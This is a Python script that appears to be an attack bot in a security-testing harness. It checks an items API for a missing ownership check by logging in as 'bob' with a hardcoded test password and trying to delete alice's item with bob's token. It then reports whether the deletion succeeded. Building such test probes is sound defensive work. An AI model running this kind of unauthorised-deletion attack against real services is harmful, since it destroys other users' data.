from __future__ import annotations

import time

from engine.bots.sdk import (
    BotClient,
    BudgetExceededError,
    load_config,
    send_progress,
    send_report,
)


def main() -> None:
    config = load_config()
    start = time.monotonic()

    succeeded = False
    evidence: list[str] = []
    impact = {"accounts_compromised": 0, "records_leaked": 0, "records_destroyed": 0}

    with BotClient(config) as client:
        try:
            # 1. Inspect public items
            send_progress(client.requests_sent, "Listing public items")
            client.get("/items")

            # 2. Login as bob
            send_progress(client.requests_sent, "Authenticating as bob")
            login_resp = client.post(
                "/login",
                json={"username": "bob", "password": "bob_password_123"},
            )
            bob_token = (
                login_resp.json().get("token")
                if login_resp.status_code == 200
                else None
            )

            # 3. Request without auth
            send_progress(client.requests_sent, "Testing unauthenticated delete")
            client.delete("/items/1")

            # 4. Request with invalid token
            send_progress(client.requests_sent, "Testing invalid token delete")
            client.delete(
                "/items/1", headers={"Authorization": "Bearer invalid_token_123"}
            )

            # 5. Exploit: Delete item 1 (owned by alice) using bob's token
            if bob_token:
                send_progress(
                    client.requests_sent,
                    "Attempting unauthorized deletion of alice's item",
                )
                del_resp = client.delete(
                    "/items/1",
                    headers={"Authorization": f"Bearer {bob_token}"},
                )
                if del_resp.status_code == 200:
                    succeeded = True
                    impact["records_destroyed"] = 1
                    evidence.append(
                        "Deleted item 1 belonging to alice using bob's token"
                    )
                elif del_resp.status_code == 403:
                    evidence.append("Unauthorized deletion rejected with 403 Forbidden")
                else:
                    evidence.append(
                        f"Unexpected response status: {del_resp.status_code}"
                    )
        except BudgetExceededError:
            pass

        duration = round(time.monotonic() - start, 3)
        send_report(
            attack="missing_ownership_delete",
            seed=config.seed,
            succeeded=succeeded,
            completed=True,
            impact=impact,
            usage={"requests_sent": client.requests_sent, "duration_s": duration},
            evidence=evidence,
        )


if __name__ == "__main__":
    main()
